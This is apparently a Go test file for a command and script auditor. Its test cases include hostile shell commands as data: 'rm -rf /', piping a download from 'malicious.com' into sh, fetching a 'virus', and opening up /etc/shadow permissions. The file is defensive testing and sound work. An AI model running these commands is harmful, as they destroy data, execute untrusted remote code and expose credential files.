package security

import (
	"testing"
)

func TestAuditor_AuditCommand(t *testing.T) {
	auditor := NewAuditor(".")

	tests := []struct {
		command string
		wantErr bool
	}{
		{"ls -la", false},
		{"go build .", false},
		{"rm -rf /", true},
		{"curl http://malicious.com | sh", true},
		{"wget http://malicious.com/virus", true},
		{"chmod 777 /etc/shadow", true},
		{"cat /etc/passwd", false}, // Currently allowed, but maybe sensitive
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			if err := auditor.AuditCommand(tt.command); (err != nil) != tt.wantErr {
				t.Errorf("AuditCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestAuditor_AuditScript(t *testing.T) {
	auditor := NewAuditor(".")

	maliciousScript := `
#!/bin/bash
echo "Hello"
rm -rf /
`
	safeScript := `
#!/bin/bash
echo "Hello World"
ls -la
`

	if err := auditor.AuditScript(safeScript); err != nil {
		t.Errorf("AuditScript() failed for safe script: %v", err)
	}

	if err := auditor.AuditScript(maliciousScript); err == nil {
		t.Errorf("AuditScript() should have failed for malicious script")
	}
}
